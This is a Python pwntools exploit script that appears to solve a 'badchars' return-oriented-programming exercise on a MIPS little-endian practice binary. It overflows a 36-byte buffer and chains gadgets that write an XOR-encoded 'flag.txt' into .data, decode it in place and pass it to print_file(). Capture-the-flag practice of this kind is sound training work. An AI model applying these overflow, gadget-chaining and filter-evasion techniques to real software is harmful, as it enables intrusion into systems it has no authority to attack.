#/usr/bin/python3
from pwn import process, p32, xor, log

shell = process("./badchars_mipsel")

offset = 36
junk = b"A" * offset

string = xor(b"flag.txt", 2)

payload  = b""
payload += junk

for i in range(0, len(string), 4):
    payload += p32(0x400930)     # lw $t9, 0xc($sp); lw $t0, 8($sp); lw $t1, 4($sp); sw $t1, ($t0); jalr $t9; addi $sp, $sp, 0x10;
    payload += p32(0x0)          # padding
    payload += string[i:i+4]     # string
    payload += p32(0x411000 + i) # .data

    payload += p32(0x400948)     # lw $t9, 0xc($sp); lw $t0, 8($sp); lw $t1, 4($sp); lw $t2, ($t1); xor $t0, $t0, $t2; sw $t0, ($t1); jalr $t9; addi $sp, $sp, 0x10;
    payload += p32(0x0)          # padding
    payload += p32(0x411000 + i) # .data
    payload += p32(0x02020202)   # xor key

payload += p32(0x400968) # lw $a0, 8($sp); lw $t9, 4($sp); jalr $t9; addi $sp, $sp, 0xc;
payload += p32(0x0)      # padding
payload += p32(0x400ab0) # print_file()
payload += p32(0x411000) # .data

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.info(f"Flag: {flag}")
